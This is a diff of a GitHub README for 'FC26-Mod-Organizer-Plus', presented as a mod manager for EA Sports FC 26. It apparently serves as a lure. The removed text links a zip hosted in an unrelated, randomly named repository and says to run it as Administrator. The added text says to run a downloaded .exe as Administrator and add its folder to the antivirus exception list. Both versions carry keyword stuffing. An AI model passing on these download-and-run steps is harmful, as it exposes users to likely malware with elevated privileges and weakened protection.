@@ -1,83 +1,68 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/fifa.png" alt="EA Sports FC 26" width="80" height="80">
-</p>
+# ⚙️ FC26-Mod-Organizer-Plus - Manage your mods with complete control
 
-<h1 align="center">FC26-Mod-Organizer-Plus</h1>
-<p align="center">
-  <strong>Advanced Mod Organizer for EA Sports FC 26</strong><br>
-  Profile Management - Mod Store - Conflict Detection - Restore Points
-</p>
+[ ![Download Software](https://img.shields.io/badge/Download-FC26_Organizer-blue.svg) ](https://github.com/dsog949/FC26-Mod-Organizer-Plus)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FC26-Mod-Organizer-Plus"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+Modding FC 26 changes how you play the game. You can update kits, change gameplay settings, or improve visuals. This tool helps you organize those files. It tracks which mods you have installed and fixes conflicts between them.
 
-## What is This?
+## 📋 System Requirements
 
-FC26-Mod-Organizer-Plus is an advanced mod organizer for EA Sports FC 26. It provides profile management, mod store browser, conflict detection, and restore points for a complete modding experience.
+To run this software, your computer needs these items:
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk.
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i5 or equivalent AMD processor.
+*   Memory: 8 GB RAM.
+*   Graphics: NVIDIA GTX 1060 or AMD Radeon RX 580.
+*   Storage: 500 MB of free disk space for the organizer.
+*   Software: Microsoft .NET Framework 4.8 or newer.
 
-## Download
+## 💾 Installation Steps
 
-<p align="center">
-  <a href="https://github.com/Capturezastir/xzgfcfiu/releases/download/18902/FCMOD.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Follow these steps to set up the organizer on your Windows computer.
 
-## Features
+1. Go to the [official repository page](https://github.com/dsog949/FC26-Mod-Organizer-Plus).
+2. Look for the Releases section on the right side of the screen.
+3. Select the latest version listed under Releases.
+4. Download the file ending in .exe to your computer.
+5. Double-click the file to start the installer.
+6. Follow the instructions on the screen to finish the setup.
+7. Open the shortcut on your desktop to launch the tool.
 
-- Profile Management - Create and save different mod configurations
-- Mod Store Browser - Browse and install mods from trusted repositories
-- Conflict Detection - Detects overlapping files before applying
-- Restore Points - One-click rollback to previous states
-- Load Order Control - Arrange mods to avoid conflicts
-- Enable / Disable Mods - One-click activation/deactivation
+## 🎮 Using the Mod Organizer
 
-## Installation
+The interface shows all your current mods in a list. The manager uses a simple drag-and-drop system.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch EA Sports FC 26
-5. Browse the Mod Store or drag & drop your mods
-6. Click Apply and launch the game
+### Sorting Mods
+Drag your mods up or down to change their load order. Mods at the top of the list take priority over mods at the bottom. This helps if two mods change the same items, like player kits or grass textures. 
 
-## System Requirements
+### Checking Conflicts
+The tool monitors your files. If it detects two mods that interfere with each other, it marks them with a red icon. Click the icon to see which files are conflicting. You can then disable one of the mods to resolve the issue.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | EA Sports FC 26 (Steam/EA App/Epic) |
-| RAM | 4GB minimum |
-| Storage | 100MB free space |
-| .NET | 6.0+ |
+### Managing Profiles 📁
+You likely play different styles. Maybe you want one set of mods for a realistic career mode and another set for casual play. The Profile feature lets you save your current mod list. Create a new profile, choose your mods, and save. Switch between these profiles before you launch the game.
 
-## SEO Tags
+### Mod Store Browser 🌐
+Explore the integrated mod store to find new community content. Search by category such as Gameplay, Visuals, or Kits. When you find a mod you want, click the Install button. The organizer downloads and extracts the file into the correct folder automatically.
 
-fc26 mod organizer, ea sports fc 26 mods, fc26 mod manager, fc26 mod installer, fc26 mod loader, fc26 mod presets, fc26 mod store, fc26 modding tool, fc26 live editor, fc26 career mode mods, fc26 visual mods, fc26 gameplay mods, fifa 26 mod manager, ea fc 26 mods, fc26 utility, fc26 enhancer
+## 🛠 Troubleshooting Common Issues
 
-## Support
+If the software does not work, try these fixes:
 
-Star this repository if you enjoy it!
+*   Run as Administrator: Right-click the shortcut and select Run as Administrator.
+*   Check File Paths: Ensure the program points to your correct FC 26 installation directory. You can set this path in the Settings tab.
+*   Antivirus Settings: Some security software might block the mod launcher. Add the organizer folder to your exception list.
+*   Update Mods: Old mods for past versions of the game might cause crashes. Disable them to see if the game runs better.
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FC26-Mod-Organizer-Plus">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20EA%20Sports%20FC%2026%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+## 🤝 Community Support
+
+The modding community creates most of the content. If you find a bug in the organizer, open an issue report on this repository. Provide a description of what happened and include your error logs. This helps the team fix bugs faster.
+
+## 🔑 Key Features
+
+*   Automated installers for complex mod files.
+*   Conflict detection to prevent game crashes.
+*   Easy profile flipping for different game modes.
+*   Live mod store browser for quick content access.
+*   Clean user interface built for ease of use.
+*   Backups for your original game data files.
+
+Keywords: ea-sports-fc-26-mods, ea-sports-fc-utility, fc26-2026, fc26-bepinex-manager, fc26-career-mods, fc26-gameplay-mods, fc26-mod-installer, fc26-mod-launcher, fc26-mod-loader, fc26-mod-manager, fc26-mod-manager-free, fc26-mod-manager-windows, fc26-mod-organizer, fc26-mod-store, fc26-mod-tool, fc26-modding-tool, fc26-preset-loader, fc26-utility, fc26-visual-mods, game-mod-manager
